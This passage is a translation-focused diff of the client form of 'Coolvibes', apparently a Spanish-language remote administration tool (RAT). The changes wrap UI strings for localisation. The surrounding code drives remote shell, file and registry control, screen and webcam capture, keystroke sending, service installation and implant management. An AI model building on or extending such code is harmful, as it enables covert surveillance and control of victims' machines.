         if Broma = 'MOUSETEMBLOROSO' then
-          ListViewBromas.Items[1].SubItems[0] := 'Desactivado';
+          ListViewBromas.Items[1].SubItems[0] := _('Desactivado');
         // El mouse se descongela si se activa el congela mouse
         if Broma = 'CONGELARMOUSE' then
-          ListViewBromas.Items[0].SubItems[0] := 'Desactivado';
+          ListViewBromas.Items[0].SubItems[0] := _('Desactivado');
         //El mouse para de temblar si se congela
       end
       else  //Si esta activada
@@ -1442,7 +1528,7 @@ begin
     end;
   end
   else
-    MessageDlg('No estás conectado !', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 //Funciones del FileManager
@@ -1452,7 +1538,7 @@ begin
   if Servidor.Connection.Connected then
     Servidor.Connection.Writeln('VERUNIDADES')
   else
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 procedure TFormControl.cmbUnidadesSelect(Sender: TObject);
@@ -1464,7 +1550,7 @@ begin
     EditPathArchivos.Text := Copy(cmbUnidades.Text, 1, 3);
   end
   else
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 procedure TFormControl.ListViewArchivosDblClick(Sender: TObject);
@@ -1472,15 +1558,15 @@ begin
 
   if not Servidor.Connection.Connected then
   begin
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
     Exit;
   end;
 
   if ListViewArchivos.Selected = nil then
-    MessageDlg('Dale doble click a una carpeta o a un archivo!', mtWarning, [mbOK], 0)
+    MessageDlg(_('Dale doble click a una carpeta o a un archivo!'), mtWarning, [mbOK], 0)
   else
   begin
-    StatusBar.Panels[1].Text := 'Listando archivos...';
+    StatusBar.Panels[1].Text := _('Listando archivos...');
     if ListViewArchivos.Selected.Caption = '<..>' then
     begin
       EditPathArchivos.Text :=
@@ -1606,7 +1692,7 @@ begin
     end;
   end
   else
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 procedure TFormControl.Oculto1Click(Sender: TObject);
@@ -1636,7 +1722,7 @@ begin
     end;
   end
   else
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 procedure TFormControl.EliminarClick(Sender: TObject);
@@ -1658,11 +1744,11 @@ begin
         FilePath := mslistviewitem.Caption;
       if mslistviewitem.ImageIndex = 3 then
       begin
-        if MessageDlg('¿Está seguro que quiere borrar la carpeta ' +extractfilename(FilePath) + '?', mtConfirmation, [mbYes, mbNo], 0) <> idNo then
+        if MessageDlg(_('¿Está seguro que quiere borrar la carpeta ') +extractfilename(FilePath) + '?', mtConfirmation, [mbYes, mbNo], 0) <> idNo then
         Servidor.Connection.Writeln('DELFOLDER|' + FilePath);
       end
       else
-      if MessageDlg('¿Está seguro que quiere borrar el archivo ' +extractfilename(FilePath) + '?', mtConfirmation, [mbYes, mbNo], 0) <> idNo then
+      if MessageDlg(_('¿Está seguro que quiere borrar el archivo ') +extractfilename(FilePath) + '?', mtConfirmation, [mbYes, mbNo], 0) <> idNo then
       Servidor.Connection.Writeln('DELFILE|' + FilePath);
       if PageControlArchivos.ActivePage = TabSheetVerArchivos then
         mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected])
@@ -1673,7 +1759,7 @@ begin
       btnactualizararchivos.Click;
   end
   else
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 procedure TFormControl.Cambiarnombre1Click(Sender: TObject);
@@ -1723,7 +1809,7 @@ begin
       (Pos('"', S) <> 0) or (Pos('<', S) <> 0) or (Pos('>', S) <> 0) then
     begin
       MessageDlg(
-        'Nombre de carpeta inválido. Una carpeta no puede tener ninguno de los siguientes carácteres: */\?"<>|',
+        _('Nombre de carpeta inválido. Una carpeta no puede tener ninguno de los siguientes carácteres:')+' */\?"<>|',
         mtError, [mbOK], 0);
       S := Item.Caption; //Así evitamos que se cambie el nombre en el ListView
     end
@@ -1732,7 +1818,7 @@ begin
         ListViewArchivos.Selected.Caption + '|' + EditPathArchivos.Text + S);
   end
   else
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 procedure TFormControl.Crearnuevacarpeta1Click(Sender: TObject);
@@ -1741,8 +1827,8 @@ var
 begin
   if Servidor.Connection.Connected then
   begin
-    DirName := InputBox('Escriba el nombre para la nueva carpeta.',
-      'Crear nueva carpeta', 'Nueva carpeta');
+    DirName := InputBox(_('Escriba el nombre para la nueva carpeta.'),
+      _('Crear nueva carpeta'), _('Nueva carpeta'));
     if DirName <> '' then
     begin
       if DirName[Length(DirName)] <> '\' then
@@ -1752,7 +1838,7 @@ begin
     btnactualizararchivos.Click;
   end
   else
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 procedure TFormControl.BtnActualizarArchivosClick(Sender: TObject);
@@ -1760,13 +1846,13 @@ begin
   if not BtnActualizarArchivos.Enabled then exit;
   if not Servidor.Connection.Connected then
   begin
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
     Exit;
   end;
 
   if Length(EditPathArchivos.Text) < 3 then
   begin
-    MessageDlg('No escribiste un directorio válido.', mtWarning, [mbOK], 0);
+    MessageDlg(_('No escribiste un directorio válido.'), mtWarning, [mbOK], 0);
     exit;
   end;
   BtnActualizarArchivos.Enabled := false;
@@ -1789,7 +1875,7 @@ begin
 
   if not Servidor.Connection.Connected then
   begin
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
     Exit;
   end;
 
@@ -1806,7 +1892,7 @@ procedure TFormControl.TreeViewRegeditDblClick(Sender: TObject);
 begin
   if not Servidor.Connection.Connected then
   begin
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
     Exit;
   end;
   TreeViewRegedit.enabled := false;
@@ -1839,7 +1925,7 @@ begin
   while Pos('|', Claves) > 0 do
   begin
     Listadas := Listadas+1;
-    Statusbar.panels[1].text := 'Listadas '+inttostr(Listadas)+' claves de '+inttostr(Total);
+    Statusbar.panels[1].text := _('Listadas ')+inttostr(Listadas)+_(' claves de ')+inttostr(Total);
     Clave := Copy(Claves, 1, Pos('|', Claves) - 1);
     Nodo  := TreeViewRegedit.Items.AddChild(TreeViewRegedit.Selected, Clave);
     //Sin seleccionar mostrar el icono de carpeta cerrada
@@ -1850,7 +1936,7 @@ begin
   end;
   TreeViewRegedit.Selected.Expand(False);
   TreeViewRegedit.Items.endupdate;
-  Statusbar.panels[1].text := 'Claves listadas';
+  Statusbar.panels[1].text := _('Claves listadas');
   TreeViewRegedit.enabled := true;
 end;
 
@@ -1901,7 +1987,7 @@ begin
     Servidor.Connection.Writeln('LISTARVALORES|' + EditPathRegistro.Text);
   end
   else
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 procedure TFormControl.N1Click(Sender: TObject);
@@ -1916,7 +2002,7 @@ begin
     end;
   end
   else
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 //Una vez editado el valor le avisamos al server
@@ -1926,7 +2012,7 @@ begin
 
   if not Servidor.Connection.Connected then
   begin
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
     Exit;
   end;
 
@@ -1940,18 +2026,18 @@ begin
   begin
     if PopupRegistro.PopupComponent.ClassType = TListView then
     begin
-      if MessageDlg('¿Está seguro de que quiere borrar el valor ' +
+      if MessageDlg(_('¿Está seguro de que quiere borrar el valor ') +
         ListViewRegistro.Selected.Caption + '?', mtConfirmation, [mbYes, mbNo], 0) <> idNo then
         Servidor.Connection.Writeln('BORRARREGISTRO|' + EditPathRegistro.Text +
           ListViewRegistro.Selected.Caption);
     end
     else
-    if MessageDlg('¿Está seguro de que quiere borrar la clave ' +
+    if MessageDlg(_('¿Está seguro de que quiere borrar la clave ') +
       TreeViewRegedit.Selected.Text + '?', mtConfirmation, [mbYes, mbNo], 0) <> idNo then
       Servidor.Connection.Writeln('BORRARREGISTRO|' + EditPathRegistro.Text);
   end
   else
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 procedure TFormControl.Valoralfanumrico1Click(Sender: TObject);
@@ -1964,7 +2050,7 @@ begin
     NewRegistro.ShowModal;
   end
   else
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 procedure TFormControl.Valorbinerio1Click(Sender: TObject);
@@ -1977,7 +2063,7 @@ begin
     NewRegistro.ShowModal;
   end
   else
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 procedure TFormControl.valorDWORD1Click(Sender: TObject);
@@ -1990,7 +2076,7 @@ begin
     NewRegistro.ShowModal;
   end
   else
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 procedure TFormControl.Valordecadenamltiple1Click(Sender: TObject);
@@ -2004,7 +2090,7 @@ begin
     NewRegistro.ShowModal;
   end
   else
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 procedure TFormControl.TreeViewRegeditContextPopup(Sender: TObject;
@@ -2054,13 +2140,13 @@ var
 begin
   if Servidor.Connection.Connected then
   begin
-    NewClave := InputBox('Escriba el nombre para la nueva clave.',
-      'Crear nueva clave', 'NuevaClave');
+    NewClave := InputBox(_('Escriba el nombre para la nueva clave.'),
+      _('Crear nueva clave'), _('NuevaClave'));
     if NewClave <> '' then
       Servidor.Connection.Writeln('NEWCLAVE|' + EditPathRegistro.Text + '|' + NewClave);
   end
   else
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 procedure TFormControl.BtnEnviarMensajeClick(Sender: TObject);
@@ -2086,10 +2172,10 @@ begin
         PChar(IntToStr(RdGrpBotonesMensaje.ItemIndex)) + '|');
     end
     else
-      MessageDlg('Selecciona algún tipo de botón', mtWarning, [mbOK], 0);
+      MessageDlg(_('Selecciona algún tipo de botón'), mtWarning, [mbOK], 0);
   end
   else
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 procedure TFormControl.TrackBarCalidadChange(Sender: TObject);
@@ -2102,7 +2188,7 @@ begin
   if not Servidor.Connection.Connected then
   begin
     //si tendriamos los timers activados esto petaria xD
-    ///MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    ///MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
     Exit;
   end;
   pedirJPG(0,'');
@@ -2118,7 +2204,7 @@ begin
   begin
     if ListViewVentanas.Selected = nil then
     begin
-      MessageDlg('Selecciona alguna ventanta para enviarle teclas.',
+      MessageDlg(_('Selecciona alguna ventana para enviarle teclas.'),
         mtWarning, [mbOK], 0);
     end
     else
@@ -2129,7 +2215,7 @@ begin
     end;
   end
   else
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 procedure TFormControl.TrackBarCalidadWebcamChange(Sender: TObject);
@@ -2143,7 +2229,7 @@ begin
 
   if not Servidor.Connection.Connected then
   begin
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
     Exit;
   end;
 
@@ -2155,7 +2241,7 @@ begin
 
   if not Servidor.Connection.Connected then
   begin
-    //MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    //MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
     exit;
   end;
 
@@ -2172,7 +2258,7 @@ begin
 
   if not Servidor.Connection.Connected then
   begin
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
     exit;
   end;
 
@@ -2181,7 +2267,7 @@ begin
 
     if(anchurapantalla = 0) then //necesitamos el tamaño de la pantalla para calcular la posicion real.
     begin
-      MessageDlg('Pide una captura primero!', mtWarning, [mbOK], 0);
+      MessageDlg(_('Pide una captura primero!'), mtWarning, [mbOK], 0);
       exit;
     end;
     
@@ -2205,7 +2291,7 @@ begin
   if Servidor.connection.Connected then
     Servidor.connection.writeln('SERVIDOR|INFO|')
   else
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 procedure TFormControl.BtnEnviarComandoServidorClick(Sender: TObject);
@@ -2213,29 +2299,29 @@ begin
 
   if not Servidor.Connection.Connected then
   begin
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
     exit;
   end;
 
-  if ComboBoxGestionDeServidor.Text = 'Cerrar' then
+  if ComboBoxGestionDeServidor.Text = _('Cerrar') then
   begin
     if MessageBox(Handle,
-      '¿Está seguro de que desea cerrar el servidor? Este no se volverá a iniciar si no están activos los métodos de auto-inicio.',
-      'Confirmación', Mb_YesNo + MB_IconAsterisk) = idYes then
+      Pchar(_('¿Está seguro de que desea cerrar el servidor? Este no se volverá a iniciar si no están activos los métodos de auto-inicio.')),
+      Pchar(_('Confirmación')), Mb_YesNo + MB_IconAsterisk) = idYes then
       Servidor.Connection.Writeln('SERVIDOR|CERRAR|');
   end;
-  if ComboBoxGestionDeServidor.Text = 'Desinstalar' then
+  if ComboBoxGestionDeServidor.Text = _('Desinstalar') then
   begin
     if MessageBox(Handle,
-      '¿Está seguro de que desea desinstalar el servidor? ¡Este será removido completamente del equipo!',
-      'Confirmación', Mb_YesNo + MB_IconAsterisk) = idYes then
+      Pchar(_('¿Está seguro de que desea desinstalar el servidor? ¡Este será removido completamente del equipo!')),
+      Pchar(_('Confirmación')), Mb_YesNo + MB_IconAsterisk) = idYes then
       Servidor.Connection.Writeln('SERVIDOR|DESINSTALAR|');
   end;
-  if ComboBoxGestionDeServidor.Text = 'Actualizar' then
+  if ComboBoxGestionDeServidor.Text = _('Actualizar') then
   begin
     if MessageBox(Handle,
-      '¿Está seguro de que desea actualizar el servidor? ¡Se volverá a enviar coolserver.dll!',
-      'Confirmación', Mb_YesNo + MB_IconAsterisk) = idYes then
+      Pchar(_('¿Está seguro de que desea actualizar el servidor? ¡Se volverá a enviar coolserver.dll!')),
+      pchar(_('Confirmación')), Mb_YesNo + MB_IconAsterisk) = idYes then
       Servidor.Connection.Writeln('SERVIDOR|ACTUALIZAR|');
   end;
 end;
@@ -2253,7 +2339,7 @@ begin
 
   if not Servidor.Connection.Connected then
   begin
-   // MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+   // MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
     self.TimerCaptureScreen.Enabled := False;
     exit;
   end;
@@ -2268,7 +2354,7 @@ var
 begin
   if not Servidor.Connection.Connected then
   begin
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
     exit;
   end;
 if PageControlArchivos.ActivePage = TabSheetVerArchivos then
@@ -2311,13 +2397,13 @@ var
 begin
   if not Servidor.Connection.Connected then
   begin
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
     exit;
   end;
 
   if EditPathArchivos.Text = '' then
   begin
-    MessageDlg('Entra al directorio primero!', mtWarning, [mbOK], 0);
+    MessageDlg(_('Entra al directorio primero!'), mtWarning, [mbOK], 0);
     exit;
   end;
 
@@ -2332,7 +2418,7 @@ begin
       Descarga := TDescargaHandler(ListViewDescargas.Items[i].Data);
       if Descarga.Origen = FilePath then
       begin
-        MessageDlg('El achivo ya se encuentra en la lista de descargas',
+        MessageDlg(('El achivo ya se encuentra en la lista de descargas'),
           mtWarning, [mbOK], 0);
         Exit;
       end;
@@ -2396,7 +2482,7 @@ begin
 
     if MD5(FilePath) <> Tmpstr then
     begin
-      MessageDlg('Intento de intrusión a archivo bloqueado: '+FilePath,mtWarning, [mbOK], 0);
+      MessageDlg(_('Intento de intrusión a archivo bloqueado: ')+FilePath,mtWarning, [mbOK], 0);
     end
     else
     begin
@@ -2499,7 +2585,7 @@ begin
     end
     else
     begin
-      (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).StatusBar.panels[3].text := 'Error al generar el thumbnail';
+      (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).StatusBar.panels[3].text := _('Error al generar el thumbnail');
     end;
     MS.Free;
 
@@ -2623,7 +2709,7 @@ begin
   else
   begin
 
-    Statusbar.panels[1].text := 'Transferencia finalizada: '+extractfilename(filename);
+    Statusbar.panels[1].text := _('Transferencia finalizada: ')+extractfilename(filename);
   end;
   if not Servidor.Terminated and Servidor.Connection.Connected then
   begin
@@ -2783,7 +2869,7 @@ var
   i, j: integer;
 begin
   for i := 0 to ListViewDescargas.Items.Count - 1 do
-    if ListViewDescargas.Items.Item[i].SubItems[0] = 'En espera' then
+    if ListViewDescargas.Items.Item[i].SubItems[0] = _('En espera') then
     begin
       if ListViewDescargas.ItemIndex = i then
         Exit;  //Es el primer item en espera no se puede subir más
@@ -2808,7 +2894,7 @@ begin
     exit;  //Si es el primero...
   //Si su item superior está tambien en espera se intercambia con él
   i := ListViewDescargas.ItemIndex;
-  if ListViewDescargas.Items.Item[i - 1].SubItems[0] = 'En espera' then
+  if ListViewDescargas.Items.Item[i - 1].SubItems[0] = _('En espera') then
   begin
     Item := TListItem.Create(ListViewDescargas.Items);
     Item.Assign(ListViewDescargas.Selected);
@@ -2829,7 +2915,7 @@ begin
     exit;  //Si es el último...
   //Si su item inferior está tambien en espera se intercambia con él
   i := ListViewDescargas.ItemIndex;
-  if ListViewDescargas.Items.Item[i + 1].SubItems[0] = 'En espera' then
+  if ListViewDescargas.Items.Item[i + 1].SubItems[0] = _('En espera') then
   begin
     Item := TListItem.Create(ListViewDescargas.Items);
     Item.Assign(ListViewDescargas.Selected);
@@ -2848,7 +2934,7 @@ var
 begin
   //Buscamos el último item en espera y le insertamos ahi
   for i := ListViewDescargas.Items.Count - 1 downto 0 do
-    if ListViewDescargas.Items.Item[i].SubItems[0] = 'En espera' then
+    if ListViewDescargas.Items.Item[i].SubItems[0] = _('En espera') then
     begin
       if ListViewDescargas.ItemIndex = i then
         Exit;  //Es el último item en espera no se puede bajar más
@@ -2869,7 +2955,7 @@ begin
   if Servidor.Connection.Connected then
     Servidor.Connection.Writeln('SHELL|ACTIVAR')
   else
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 
@@ -2877,7 +2963,7 @@ procedure TFormControl.ComboBoxShellCommandKeyPress(Sender: TObject; var Key: ch
 begin
   if not Servidor.Connection.Connected then
   begin
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
     exit;
   end;
 
@@ -2910,8 +2996,8 @@ begin
     ComboBoxShellCommand.Font := DlgFont.Font;
     if MemoShell.Color = MemoShell.Font.Color then
       MessageBox(Handle,
-        'Se escogió el mismo color para la fuente y el fondo. Escoge otro.',
-        'Advertencia', 0 + MB_IconWarning);
+        Pchar(_('Se escogió el mismo color para la fuente y el fondo. Escoge otro.')),
+        Pchar(_('Advertencia')), 0 + MB_IconWarning);
   end;
 end;
 
@@ -2923,8 +3009,8 @@ begin
     ComboBoxShellCommand.Color := DlgColors.Color;
     if MemoShell.Color = MemoShell.Font.Color then
       MessageBox(Handle,
-        'Se escogió el mismo color para la fuente y el fondo. Escoge otro.',
-        'Advertencia', 0 + MB_IconWarning);
+        Pchar(_('Se escogió el mismo color para la fuente y el fondo. Escoge otro.')),
+        Pchar(_('Advertencia')), 0 + MB_IconWarning);
   end;
 end;
 
@@ -2939,20 +3025,20 @@ begin
   if Servidor.Connection.Connected then
     Servidor.Connection.Writeln('SHELL|DESACTIVAR')
   else
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 
 procedure TFormControl.Guardarcmo1Click(Sender: TObject);
 begin
-  DlgGuardar.Title      := 'Guardar texto :: Coolvibes ::';
+  DlgGuardar.Title      := _('Guardar texto :: Coolvibes ::');
   DlgGuardar.InitialDir := GetCurrentDir();
-  DlgGuardar.Filter     := 'Archivo de texto (*.txt)|*.txt';
+  DlgGuardar.Filter     := _('Archivo de texto')+' (*.txt)|*.txt';
   DlgGuardar.DefaultExt := 'txt';
   if DlgGuardar.Execute then
   begin
     MemoShell.Lines.SaveToFile(DlgGuardar.FileName);
-    StatusBar.Panels[1].Text := 'Archivo guardado como: ' + DlgGuardar.FileName;
+    StatusBar.Panels[1].Text := _('Archivo guardado como: ') + DlgGuardar.FileName;
   end;
 end;
 
@@ -2961,7 +3047,7 @@ begin
   BtnServicios.enabled := false;
   if not Servidor.Connection.Connected then
   begin
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
     exit;
   end;
   ListViewServicios.Clear;
@@ -2972,7 +3058,7 @@ procedure TFormControl.DEtener1Click(Sender: TObject);
 begin
   if not Servidor.Connection.Connected then
   begin
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
     exit;
   end;
   Servidor.Connection.Writeln('DETENERSERVICIO' + ListViewServicios.Selected.Caption);
@@ -2983,7 +3069,7 @@ begin
 
   if not Servidor.Connection.Connected then
   begin
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
     exit;
   end;
 
@@ -2999,7 +3085,7 @@ procedure TFormControl.Desinstalar1Click(Sender: TObject);
 begin
   if not Servidor.Connection.Connected then
   begin
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
     exit;
   end;
   
@@ -3016,7 +3102,7 @@ begin
   btnSiguienteInstalarServicio.Visible := True;
   BtnCancelarInstalarServicio.Visible := True;
   MultiEditInstalarServicio.Visible := True;
-  MultiEditInstalarServicio.Text := '{Escribir el nombre del servicio}';
+  MultiEditInstalarServicio.Text := _('{Escribir el nombre del servicio}');
 end;
 
 procedure TFormControl.BtnCancelarInstalarServicioClick(Sender: TObject);
@@ -3031,7 +3117,7 @@ end;
 procedure TFormControl.btnSiguienteInstalarServicioClick(Sender: TObject);
 begin
   NombreSI := MultiEditInstalarServicio.Text;
-  MultiEditInstalarServicio.Text := '{Escribir la descripción del servicio}';
+  MultiEditInstalarServicio.Text := _('{Escribir la descripción del servicio}');
   btnSiguienteInstalarServicio.Visible := False;
   btnInstServicios.Visible := True;
 end;
@@ -3039,7 +3125,7 @@ end;
 procedure TFormControl.btnInstServiciosClick(Sender: TObject);
 begin
   descripcionSI := MultiEditInstalarServicio.Text;
-  MultiEditInstalarServicio.Text := '{Ruta del ejecutable a poner de servicio}';
+  MultiEditInstalarServicio.Text := _('{Ruta del ejecutable a poner de servicio}');
   btnInstServicios.Visible := False;
   btnInstServicios2.Visible := True;
 end;
@@ -3048,7 +3134,7 @@ procedure TFormControl.btnInstServicios2Click(Sender: TObject);
 begin
   if not Servidor.Connection.Connected then
   begin
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
     exit;
   end;
   RutaSI := MultiEditInstalarServicio.Text;
@@ -3097,7 +3183,7 @@ var
 begin
   if not Servidor.Connection.Connected then
   begin
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
     exit;
   end;
 
@@ -3275,12 +3361,12 @@ begin
   if Servidor.Connection.Connected then
   begin
     if ListViewVentanas.Selected = nil then
-      MessageDlg('Selecciona alguna ventana', mtWarning, [mbOK], 0)
+      MessageDlg(_('Selecciona alguna ventana'), mtWarning, [mbOK], 0)
     else                         //Recibe el PID de la ventana con Handle
       Servidor.Connection.Writeln('WINPROC|' + ListViewVentanas.Selected.SubItems[0]);
   end
   else
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 procedure TFormControl.SpinCaptureScreenChange(Sender: TObject);
@@ -3299,7 +3385,7 @@ procedure TFormControl.CheckBoxAutoCapturaScreenClick(Sender: TObject);
 begin
   if not Servidor.Connection.Connected then
   begin
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
     Exit;
   end;
 
@@ -3325,7 +3411,7 @@ var
 begin
   if not Servidor.Connection.Connected then
   begin
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
     exit;
   end;
   
@@ -3372,7 +3458,7 @@ procedure TFormControl.CheckBoxAutoCamCaptureClick(Sender: TObject);
 begin
   if not Servidor.Connection.Connected then
   begin
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
     Exit;
   end;
 
@@ -3391,7 +3477,7 @@ begin
 
   if not Servidor.Connection.Connected then
   begin
-   // MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+   // MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
     self.TimerCamCapture.Enabled := False;
     exit;
   end;
@@ -3493,9 +3579,9 @@ begin          //la funcion que pide las capturas de webcam, de pantalla y los t
 end;
 procedure TFormControl.Guardarimagen1Click(Sender: TObject);
 begin
-  DlgGuardar.Title      := 'Guardar imagen ::Coolvibes Rat::';
+  DlgGuardar.Title      := _('Guardar imagen ::Coolvibes::');
   DlgGuardar.InitialDir := GetCurrentDir();
-  DlgGuardar.Filter     := 'Imagen .Jpeg|*.jpg';
+  DlgGuardar.Filter     := _('Imagen')+' .Jpeg|*.jpg';
   DlgGuardar.DefaultExt := 'jpg';
   if DlgGuardar.Execute then
   begin
@@ -3504,7 +3590,7 @@ begin
       imgCaptura.Picture.SaveToFile(DlgGuardar.FileName)
     else  //Sino es una webcam
       imgWebcam.Picture.SaveToFile(DlgGuardar.FileName);
-    StatusBar.Panels[1].Text := 'Imagen guardada como: ' + DlgGuardar.FileName;
+    StatusBar.Panels[1].Text := _('Imagen guardada como: ') + DlgGuardar.FileName;
   end;
 end;
 
@@ -3524,29 +3610,29 @@ procedure TFormControl.PopupGuardarPantallaoWebcamPopup(Sender: TObject);
 begin
   if PageControl.activepage = TabScreencap then
   begin
-    PopupGuardarPantallaoWebcam.items[0].caption := 'Guardar captura de pantalla';
+    PopupGuardarPantallaoWebcam.items[0].caption := _('Guardar captura de pantalla');
     if(PrefijoGuardarCaptura = '') then
     begin
-      PopupGuardarPantallaoWebcam.items[1].caption := 'Activar guardado automático';
+      PopupGuardarPantallaoWebcam.items[1].caption := _('Activar guardado automático');
       PopupGuardarPantallaoWebcam.items[1].checked := false;
     end
     else
     begin
-      PopupGuardarPantallaoWebcam.items[1].caption := 'Desactivar guardado automático';
+      PopupGuardarPantallaoWebcam.items[1].caption := _('Desactivar guardado automático');
       PopupGuardarPantallaoWebcam.items[1].checked := true;
     end;
   end
   else
   begin
-    PopupGuardarPantallaoWebcam.items[0].caption := 'Guardar captura de webcam';
+    PopupGuardarPantallaoWebcam.items[0].caption := _('Guardar captura de webcam');
     if(PrefijoGuardarWebcam = '') then
     begin
-      PopupGuardarPantallaoWebcam.items[1].caption := 'Activar guardado automático';
+      PopupGuardarPantallaoWebcam.items[1].caption := _('Activar guardado automático');
       PopupGuardarPantallaoWebcam.items[1].checked := false;
     end
     else
     begin
-      PopupGuardarPantallaoWebcam.items[1].caption := 'Desactivar guardado automático';
+      PopupGuardarPantallaoWebcam.items[1].caption := _('Desactivar guardado automático');
       PopupGuardarPantallaoWebcam.items[1].checked := true;
     end;
   end;
@@ -3555,10 +3641,10 @@ end;
 procedure TFormControl.Guardadoautomtico1Click(Sender: TObject);
 begin
 if((PrefijoGuardarCaptura = '') and (PageControl.activepage = TabScreencap)) then
-    PrefijoGuardarCaptura := InputBox('Prefijo captura','Prefijo captura', 'captura_')
